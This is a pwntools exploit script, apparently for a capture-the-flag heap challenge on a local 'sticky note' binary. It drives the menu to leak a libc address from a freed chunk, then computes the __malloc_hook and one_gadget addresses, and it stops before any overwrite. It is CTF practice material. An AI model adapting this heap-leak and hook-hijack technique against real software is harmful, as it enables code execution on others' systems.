    from pwn import *
#context.log_level='debug'
context.terminal=["tmux","split","-h"]
p = process("./pwn")
libc = ELF("./libc.so")

def add(size,content):
	p.sendlineafter("Your choice:",str(1))
	p.sendlineafter("\nInput the length of data:",str(size))
	p.sendlineafter("Leave your message:\n",content)

def delete(idx):
	p.sendlineafter("Your choice:",str(2))
	p.sendlineafter("\nInput the index of sticky note that you want to delete:\n",str(idx))

def show():
	p.sendlineafter("Your choice:",str(3))

def edit(idx,content):
	p.sendlineafter("Your choice:",str(4))
	p.sendlineafter("Input the index of sticky note that you want to modify:\n",str(idx))
	p.sendlineafter("Enter what you want to modify:\n",content)

add(0x7f,"") #1
add(0x7f,"") #2
delete(1)
add(0x7f,"aaaaaaa") #3
show()
p.recvuntil("Sticky note:aaaaaaa\n")
libc_base = u64(p.recvuntil("\n",drop=True).ljust(8,"\x00"))-0x3c4b78
log.success("libc_base : 0x%x"%libc_base)
malloc_hook = libc_base+libc.symbols['__malloc_hook']
log.success("malloc_hook:0x%x"%malloc_hook)
log.success("one_gadget:0x%x"%(libc_base+0xf1147))
